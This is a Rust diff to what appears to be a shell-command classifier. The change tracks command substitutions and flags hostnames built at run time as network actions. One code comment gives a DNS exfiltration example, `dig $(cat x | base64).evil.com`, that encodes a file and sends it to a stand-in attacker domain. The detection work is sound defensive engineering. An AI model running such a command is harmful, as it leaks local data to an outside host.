@@ -308,6 +308,8 @@ fn classify_as_written(
     super::push::note(&argv, program, ctx, sink);
     super::executes::note(&argv, program, &cmd.reads, ctx, sink);
     super::installs::note(&argv, program, sink)?;
+    let substituted = cmd.substitutions_of_last(argv.len());
+    pipelines::push_substituted_programs(&substituted, &argv, program, sink)?;
 
     let substitution = in_place::substitution(&argv, program);
     push_command(cmd, &argv, program, substitution, ctx, sink)?;
@@ -440,7 +442,7 @@ fn classify_as_written(
             payload::scan_payload(text, program, ctx, sink)?;
         }
     }
-    options::classify(&argv, program, ctx, sink, depth)
+    options::classify(&argv, &substituted, program, ctx, sink, depth)
 }
 
 /// Classify a wrapper's inner argv (`sudo rm …` → `rm …`) as its own command.
@@ -551,6 +553,11 @@ fn classify_arguments(
             } else {
                 AtomicAction::NetWord { host }
             })?;
+            continue;
+        } else if names_hosts && let Some(host) = host::of_built_argument(program, tok) {
+            // `dig $(cat x | base64).evil.com`: a name built at run time still
+            // goes to the domain it ends in (DNS exfiltration)
+            sink.push(AtomicAction::Net { host })?;
             continue;
         } else {
             operands::file_operand(tok, program, options_ended)
